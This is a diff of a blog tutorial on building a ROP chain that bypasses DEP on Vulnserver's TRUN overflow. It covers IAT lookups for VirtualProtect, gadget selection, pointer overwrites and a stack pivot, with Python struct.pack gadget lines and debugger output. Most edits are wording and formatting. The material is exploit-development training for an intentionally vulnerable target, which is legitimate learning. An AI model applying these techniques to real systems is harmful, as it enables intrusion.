@@ -10,7 +10,7 @@ comment: true
 
 While searching online for a `Vulnserver TRUN Overflow` proof-of-concept capable of circumventing `DEP`, all the available examples seemed to utilize `Mona` to construct the `ROP` chain, drawing gadgets from multiple modules with the majority (if not all) being system libraries.
 
-The challenge here lies in the fragile nature of the `ROP` chain when relying on system libraries. Since 2007, system libraries are compiled with `ASLR`, making their memory addresses unpredictable. What complicates this is that the base addresses for these libraries are set when the system boots up. So, if you're using hardcoded addresses from these libraries in your `ROP` chain, your exploit will fail if the target system restarts.
+The challenge here lies in the fragile nature of the `ROP` chain when relying on system libraries. Since 2007, Windows system libraries are compiled with `ASLR`, making their memory addresses unpredictable. What complicates this is that the base addresses for these libraries are set when the system boots up. So, if you're using hardcoded addresses from these libraries in your `ROP` chain, your exploit will fail if the target system restarts.
 
 Furthermore, even if you somehow manage to sidestep the `ASLR` issue, you'll still be tied down to a specific Windows version. System libraries are often updated or changed between different versions of the OS. So, the gadgets you rely on today might not be available or could be located at different addresses in a future Windows update. This lack of adaptability limits the usefulness of your exploit across different environments.
 
@@ -103,6 +103,7 @@ add r32, esp ; ret
 // assuming that r32 is 0x00
 sub esp, r32
 neg r32
+ret
 ```
 
 In this specific scenario, however, we didn't find any gadgets that would help with this. Interestingly, we did find that `EAX` is pointing to the stack, specifically, it is `0x7E0` bytes away from the stack pointer. This is advantageous as we can use the current `EAX` address to construct the `VirtualProtect` call without any interference from the other gadgets. Although it's possible to place the skeleton shown above on the stack and reach  it by adjusting `EAX` using arithmetic instructions, there's really no reason to do so.
@@ -118,7 +119,7 @@ You'll soon observe that in this specific gadget chain, `EAX` is frequently used
 
 While `essfunc` isn't compiled with `ASLR`, the `VirtualProtect` function, housed in `kernel32`, is. This means that the `VirtualProtect` address will be subject to randomization. So, the puzzle here is: how do we find the address of `VirtualProtect` during runtime?
 
-Enter the `Import Address Table (IAT)`, a powerful mechanism for tackling this issue. As one Stack Overflow answer explains:
+Enter the `Import Address Table (IAT)`, a powerful mechanism for tackling this issue. As one [Stack Overflow answer](https://reverseengineering.stackexchange.com/a/16872) explains:
 
 ```text
 The Import Address Table consists of function pointers and is utilized to fetch function addresses when DLLs are loaded. A compiled application is engineered to use these function pointers instead of hardcoding direct addresses.
@@ -134,9 +135,9 @@ Here's a quick guide that illustrates the process:
 62507120		VirtualProtect	KERNEL32
 ```
 
-2. The address `0x62507120` serves as the hardcoded pointer directing to the actual `VirtualProtect` address.
+The address `0x62507120` serves as the hardcoded pointer directing to the actual `VirtualProtect` address.
 
-3. Now, connect a debugger like WinDbg to `vulnserver.exe`. Use the following command to dereference the pointer and reveal the first few instructions at the address, along with the symbol name:
+2. Now, connect a debugger like WinDbg to `vulnserver.exe`. Use the following command to dereference the pointer and reveal the first few instructions at the address, along with the symbol name:
 
 ```text
 0:000> u poi(0x62507120)
@@ -176,16 +177,22 @@ Moreover, these gadgets look daunting at first, due to the mov `[esp+0x00], eax`
 ```text
 push [eax]
 pop ebx
+...
+ret
 ```
 
 ```text
 xor eax, eax / sub eax, eax
 add eax, [ebx]
+...
+ret
 ```
 
 ```text
 xor eax, eax / sub eax, eax
 or eax, [ebx]
+...
+ret
 ```
 
 Regrettably, upon further investigation, the `essfunc` module doesn't offer such alternatives. The only viable option remains:
@@ -356,6 +363,7 @@ In scenarios where a gadget might introduce unintended effects—such as an arbi
 ```text
 push eax
 pop [ebx]
+...
 ret
 ```
 
@@ -394,7 +402,7 @@ Curiously, we find ourselves back at the initial issue - we need a gadget capabl
 mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC] 
 ```
 
-This results in the following gadget chain:
+This results in the following sequence of gadgets: 
 
 ```python
 rop += struct.pack('<L', 0x625014fc) # pop ebx ; ret
@@ -404,7 +412,7 @@ rop += struct.pack('<L', 0x625012f7) # pop ebp; ret
 rop += struct.pack('<L', 0x62501ea9) # mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC]
 ```
 
-Incorporating this into our proof of concept, we can step through the debugger to get a btter understanding of what is happening.
+Incorporating this into the proof of concept, we can step through the debugger to get a btter understanding of what is happening.
 
 The first executed instruction is `pop ebx ; ret`. Skipping past this instruction reveals that `EBX` holds the pointer's address:
 
@@ -445,7 +453,7 @@ The subsequent instruction seems complex, but is actually innocuous. It simply o
 62501eab 8b442424 mov eax,dword ptr [esp+24h]
 ```
 
-In our scenario, this is harmless, but it does mean `EAX` must be considered a scratch register.
+In our scenario, this is harmless, but it does mean `EAX` must be considered a scratch register (circling back to what was alluded near the beginning of the writeup).
 
 The next executed instruction, `mov dword ptr [ebx+4],eax`, changes the second `DWORD` pointed to by `EBX`, but this is inconsequential.
 
@@ -484,32 +492,42 @@ We can identify several gadgets to transfer the value from `EAX/ECX` to `EBX`, w
 
 ```text
 mov ebx, r32
+...
+ret
 ```
 
 ```text
 push r32
 pop ebx
+...
+ret
 ```
 
 ```text
-xchg r32, ebx 
-or
-xchg ebx, r32
+xchg r32, ebx / xchg ebx, r32
+...
+ret
 ```
 
 ```text
 xor ebx, ebx / sub ebx, ebx
 add ebx, r32
+...
+ret
 ```
 
 ```text
 xor ebx, ebx / sub ebx, ebx
 or ebx, r32
+...
+ret
 ```
 
 ```text
 mov ebx, 0xFFFFFFFF
 and ebx, r32
+...
+ret
 ```
 
 But we face a challenge. What's intriguing about `ROP` chains are the unexpected outcomes some gadgets yield. Here's an illustrative example:
@@ -528,7 +546,7 @@ Let's breakdown the gadget to better understand what it does:
 
 While individually they might seem unimpressive, their combined effect in the gadget is potent.
 
-To grasp its function, we'll navigate through a debugger using a specified sequence of gadgets. Here's a snapshot of the gadget order:
+To grasp its function, we'll navigate through a debugger using a specified sequence of gadgets. Here's how the sequence of gadget currently appears:
 
 ```python
 rop = b''
@@ -624,7 +642,7 @@ rop += struct.pack('<L', 0x41414141) # junk will be overwritten by [esp + 0x00]
 rop += struct.pack('<L', 0x62501d08) # ! int3 (breakpoint instruction) 
 ```
 
-Let's set a brekpoint at the address of the instruction which restores `EAX` from `ECX` aka `0x6250219d` and step through-it once again.
+Let's set a breakpoint at the address of the instruction which restores `EAX` from `ECX` aka `0x6250219d` and step through-it once again.
 
 ```text
 Breakpoint 0 hit
@@ -634,7 +652,7 @@ essfunc!EssentialFunc14+0xbd3:
 
 After this gadget is executed, `EAX` points to the start of the `VirtualProtect` skeleton once again which the address is `0x00ecf228`.
 
-Let's step through the gadgets until the `mov  [esp+0x00], eax ; call  [0x62507124]` instruction is reached:
+Stepping through the gadgets until the `mov  [esp+0x00], eax ; call  [0x62507124]` instruction is reached:
 
 ```text
 essfunc!EssentialFunc14+0x4d3:
@@ -700,6 +718,8 @@ ebx=00ecf228
 
 As shown above, the program will proceed to the address of the subsequent gadget in the sequence, maintaining the flow of the chain!
 
+### Back to overriding the first placeholder
+
 Having set `EBX` to point to the beginning of the `VirtualProtect` skeleton and adjusted the pointers to reference the addresses of gadgets that emulate specific behaviors, the next step is to replace the first `DWORD` in the skeleton with the `VirtualProtect` address. As discussed earlier, the address of `VirtualProtect` was obtained at runtime by accessing the `IAT`.
 
 Now, let's refocus on the subsequent gadget which serves our purpose:
@@ -708,7 +728,7 @@ Now, let's refocus on the subsequent gadget which serves our purpose:
 mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC] 
 ```
 
-For this to work, `EAX` should contain the address of the `VirtualProtect` stub. To fit this requirement, we'll need to restructure our gadget chain. One of the recurrent aspects of crafting `ROP` chains is this need to occasionally revisit and adjust the sequence to ensure functionality. Rarely do you build a `ROP` chain in a linear fashion from beginning to end; instead, there's often a need to skip around various segments.
+For this to work, `EAX` should contain the address of the `VirtualProtect` stub. To fit this requirement, we'll need to restructure our gadget chain. One of the recurrent aspects of crafting `ROP` chains is this need to occasionally revisit and adjust the sequence to ensure functionality. Rarely do you build a `ROP` chain in a linear fashion from beginning to end; instead, there's often a need to skip around and return to various segments: 
 
 As such, our gadget chain will now be the following:
 
@@ -811,7 +831,7 @@ The result, `0x0000000100000000`, represents a value that has exceeded the 4-byt
 
 Leveraging the nuances of `x86` arithmetic overflow offers unique ways to "increment" a value. Here are some common approaches:
 
-1. The Power of the `neg` Instruction
+#### The Power of the `neg` Instruction
 
 The `neg` operation calculates the two's complement of a value, essentially subtracting it from `0`.
 
@@ -824,7 +844,7 @@ Evaluate expression: -4294967036 = ffffffff`00000104
 
 After this, an `add r32, r32` gadget can be employed to augment the value of the destination operand by `0x104`.
 
-2. Emulating the `neg` Behavior
+#### Emulating the `neg` Behavior
 
 In scenarios where a handy `neg` instruction-containing gadget is missing, it's still possible to simulate its operation using other instructions:
 
@@ -836,17 +856,14 @@ sub eax, ecx
 // EAX is now 0x104
 ```
 
-To reset `EAX` to `0x00`, several alternatives exist:
+To null out `EAX`, several alternatives exist:
 
 ```text
 xor eax, eax
-```
-
-```text
 sub eax, eax
 ```
 
-3. The Intricacies of the `sub` Instruction
+#### Intricacies of the `sub` Instruction
 
 Using a `sub` instruction to increment might sound counterintuitive, but thanks to arithmetic overflow, it’s possible.
 
@@ -921,7 +938,7 @@ Fortunately, two more fitting gadgets were uncovered:
 
 The first gadget can overwrite the second placeholder with `EAX`, while the second gadget can overwrite the third. Recalling the `VirtualProtect` skeleton from earlier discussions, both the second and third placeholders need the same value, the shellcode's location. Thus, with these two gadgets, two placeholders can be filled in one go.
 
-The `call [0x625070DC]` is the same instruction at the end of the gadget that originally wrote the overwrote the first placeholder with the address of the `VirtualProtect` stub which was held by `EAX`. Since this address (`0x625070DC`) already points to a gadget mimicking a return, no further action is needed.
+The `call [0x625070DC]` is the same instruction at the end of the gadget that originally overwrote the first placeholder with the address of the `VirtualProtect` stub which was held by `EAX`. Since this address (`0x625070DC`) already points to a gadget mimicking a return, no further action is needed.
 
 Yet, the second gadget introduces yet another call to a hardcoded pointer (`0x62507104`). This can be handled similarly by reassigning the address this pointer points to, to mimic a return.
 
@@ -946,7 +963,7 @@ rop += struct.pack('<L', 0x62501ecd) # mov  [ebx+0x08], eax ; call  [0x62507104]
 
 ### Overriding the rest of the placeholders
 
-Usually, as you progress deep into a gadget chain, you'll begin to treat certain gadgets almost like functions, reusing them as needed. We'll be adopting this approach for the remaining placeholders, which are as follows:
+Usually, as you progress deep into a gadget chain, you'll begin to treat certain sequences of gadgets like functions, reusing them as needed. We'll be adopting this approach for the remaining placeholders, which are as follows:
 
 - dwSize
 - flNewProtect
@@ -991,24 +1008,26 @@ Note: In the context below, `r32` represents the register that targets the begin
 ```text
 push r32
 pop esp
+...
 ret
 ```
 
 ```text
 mov esp, r32
+...
 ret
 ```
 
 ```text
-xchg r32, esp
+xchg r32, esp // xchg esp, r32
+...
 ret
-// alternatively xchg esp, r32
-
 ```
 
 ```text
 xor esp, esp / sub esp, esp
 or esp, r32
+...
 ret
 ```
 
@@ -1029,11 +1048,11 @@ For effective use of the `leave` instruction, it's essential to transfer the poi
 0x625017c0: mov ebp, eax ; call  [0x625070E8] 
 ```
 
-Breaking down the process:
+Breaking down how this gadget will be used:
 
-The initial step is transferring `EBX` to `EAX`, though no direct gadget facilitates this action. A slight workaround is considered since it's known that `ESI` can be moved into to `EAX` and `EBX` can be moved into `ESI` via the `add esi, ebx` gadget.
+The initial step is transferring `EBX` to `EAX`, though no direct gadget facilitates this action. A slight workaround is considered since it's known that `EBX` can be moved into to `ESI` via the `add esi, ebx` gadget, and `ESI` can then be moved into `EAX`.
 
-The culmination involves leveraging the `mov ebp, eax ; call [0x625070E8]` gadget to trigger the `leave ; ret` instruction. This is achieved by redirecting the `0x625070E8` pointer to insead point to a gadget which is the `leave ; ret` command.
+The involves leveraging the `mov ebp, eax ; call [0x625070E8]` gadget to trigger the `leave ; ret` instruction. This is achieved by redirecting the `0x625070E8` pointer to insead point to a gadget which is the `leave ; ret` command.
 
 This requires  an additional pointer overwrite addition at the start of the gadget chain, as shown below:
 
@@ -1047,7 +1066,7 @@ rop += struct.pack('<L', 0x62501ea9) # mov  [ebx], eax ; mov eax,  [esp+0x24] ; 
 
 Ultimately, the goal is to move the pointer to the `VirtualProtect` skeleton from `EBX` into `EAX`. Notably, `EBX` is currently pointing to the fourth `DWORD` within the `VirtualProtect` skeleton, therefore requiring an adjustment.
 
-Before making any modifications, it's crucial to consider a specific scenario. As outlined earlier, when `EBP` gets moved into `ESP`, the `leave` instruction will then pop a `DWORD` off the stack into `EBP`. If the topmost value on the stack at that time happens to be the `VirtualProtect` address, it will be moved into `EBP`, thereby disrupting the entire gadget chain.
+Before making any modifications, it's crucial to consider the following specific scenario. As outlined earlier, when `EBP` gets moved into `ESP`, the `leave` instruction will then pop a `DWORD` off the stack into `EBP`. If the topmost value on the stack at that time happens to be the `VirtualProtect` address, it will be moved into `EBP`, thereby completely destroying the entire gadget chain.
 
 Provided below is a demonstration of what would happen, please keep in mind that the `leave` instruction was substituted for the more explicit `mov esp, ebp ; pop ebp` instructions:
 
@@ -1106,7 +1125,7 @@ The remedy to this situation is to adjust `EBX` so that it doesn't point directl
 // observe that ESP does point to the VirtualProtect address
 ```
 
-Here is the sequence of gadgets that will adjust `EBX` to point to the start of the `VirtualProtect` skeleton - `0x04`, move the pointer into `EAX` and execute the stack pivot:
+Lastly the following sequence of gadgets that will adjust `EBX` to point to the start of the `VirtualProtect` skeleton - `0x04`, move the pointer into `EAX` and execute the stack pivot:
 
 ```python
 rop += struct.pack('<L', 0x625014d5) # pop eax ; ret 
@@ -1124,8 +1143,9 @@ rop += struct.pack('<L', 0x625017c0) # mov ebp, eax ; call  [0x625070E8]
 
 ## Conclusion
 
-The aim of this writeup was to make it as straightforward and linear as possible. But achieving this is often challenging, especially with complex subjects.
+Writeups on complex topics like this can be challenging to grasp without trying them out firsthand.
 
+The final `ROP` chain can be found at the following link:
 https://gist.github.com/m-q-t/4eb78075e708dc0ec51f93a96964ee9b
 
 Thanks for reading.
